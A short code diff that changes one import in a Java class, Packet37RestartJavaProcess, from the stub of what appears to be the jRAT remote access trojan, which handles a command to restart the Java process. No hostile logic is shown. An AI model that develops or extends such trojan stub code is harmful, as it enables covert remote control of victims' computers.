@@ -1,8 +1,9 @@
 package se.jrat.stub.packets.incoming;
 
-import se.jrat.common.OperatingSystem;
 import se.jrat.stub.Connection;
 import se.jrat.stub.utils.Utils;
+
+import com.redpois0n.oslib.OperatingSystem;
 
 public class Packet37RestartJavaProcess extends AbstractIncomingPacket {
 
